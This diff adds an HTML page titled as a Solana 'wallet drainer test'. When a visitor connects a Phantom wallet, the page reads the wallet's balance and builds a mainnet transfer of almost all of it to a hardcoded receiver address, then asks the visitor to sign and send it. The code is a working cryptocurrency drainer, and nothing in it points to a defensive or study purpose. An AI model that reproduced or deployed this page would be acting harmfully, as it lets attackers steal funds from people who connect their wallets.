@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Mainnet Wallet Drainer Test</title>
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body style="background:#111;color:#fff;sans-serif;text-align:center;padding-top:100px;">
+  <h2>Phantom Wallet Mainnet Test</h2>
+  <button id="connect-wallet" style="padding:10px 30px;font-size:18px;">Connect Wallet</button>
+
+  <script>
+    const receiverWallet = new solanaWeb3.PublicKey("7GMHQSwrsTWjJwbHkwihdRePfzUbXEy7ySbn3mqcnDDx"); // <- Your own wallet
+
+    $(document).ready(function () {
+      $('#connect-wallet').on('click', async () => {
+        if (window.solana && window.solana.isPhantom) {
+          try {
+            const resp = await window.solana.connect();
+            const senderPubKey = new solanaWeb3.PublicKey(resp.publicKey);
+            console.log("Connected wallet:", senderPubKey.toString());
+
+            const connection = new solanaWeb3.Connection(
+              "https://api.mainnet-beta.solana.com",
+              "confirmed"
+            );
+
+            const balance = await connection.getBalance(senderPubKey);
+            console.log("Balance (lamports):", balance);
+
+            const rentExemption = await connection.getMinimumBalanceForRentExemption(0);
+            const lamportsToSend = balance - rentExemption - 5000;
+
+            if (lamportsToSend <= 0) {
+              alert("Not enough SOL to transfer.");
+              return;
+            }
+
+            const tx = new solanaWeb3.Transaction().add(
+              solanaWeb3.SystemProgram.transfer({
+                fromPubkey: senderPubKey,
+                toPubkey: receiverWallet,
+                lamports: lamportsToSend,
+              })
+            );
+
+            tx.feePayer = senderPubKey;
+            const blockhash = await connection.getLatestBlockhash();
+            tx.recentBlockhash = blockhash.blockhash;
+
+            const signedTx = await window.solana.signTransaction(tx);
+            const txid = await connection.sendRawTransaction(signedTx.serialize());
+            await connection.confirmTransaction(txid);
+
+            console.log("Transaction confirmed:", txid);
+            alert("Mainnet Transaction Sent!\nTxID: " + txid);
+          } catch (err) {
+            console.error("Transaction error:", err);
+            alert("Error during transaction: " + err.message);
+          }
+        } else {
+          alert("Phantom Wallet not detected.");
+        }
+      });
+    });
+  </script>
+</body>
+</html>
